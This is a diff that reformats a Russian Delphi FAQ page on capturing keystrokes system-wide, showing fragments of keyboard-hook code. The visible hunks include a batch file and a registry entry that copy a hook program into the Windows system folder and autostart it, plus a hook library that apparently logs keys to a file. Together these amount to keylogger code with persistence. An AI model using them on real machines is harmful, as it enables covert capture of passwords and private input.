@@ -7,27 +7,23 @@ Date: 01.01.2007
 Как отловить нажатия клавиш для всех процессов в системе?
 =========================================================
 
-::: {.date}
-01.01.2007
-:::
+Вариант 1:
 
- 
-
-- Setup.bat
+Setup.bat
 
     @echo off
     copy HookAgnt.dll %windir%\system
     copy kbdhook.exe %windir%\system
     start HookAgnt.reg
 
-- HookAgnt.reg
+HookAgnt.reg
 
     REGEDIT4
      
     [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
     "kbdhook"="kbdhook.exe"
 
-- KbdHook.dpr
+KbdHook.dpr
 
     program cwbhook;
      
@@ -187,10 +183,13 @@ KeyboardHook.pas
     end;
      
     end.
-
  
 
 ------------------------------------------------------------------------
+
+Вариант 2:
+
+Source: <https://delphiworld.narod.ru>
 
     library Hook;
     uses Windows, SysUtils;
@@ -199,6 +198,7 @@ KeyboardHook.pas
         KeyArray: array[0..19] of char;
         KeyArrayPtr: integer;
         CurFile:text;
+    
     function GlobalKeyBoardHook(code: integer; wParam: integer; lParam:
     integer): longword; stdcall;
     var
@@ -244,4 +244,3 @@ KeyboardHook.pas
     begin
     end.
 
-Взято с <https://delphiworld.narod.ru>
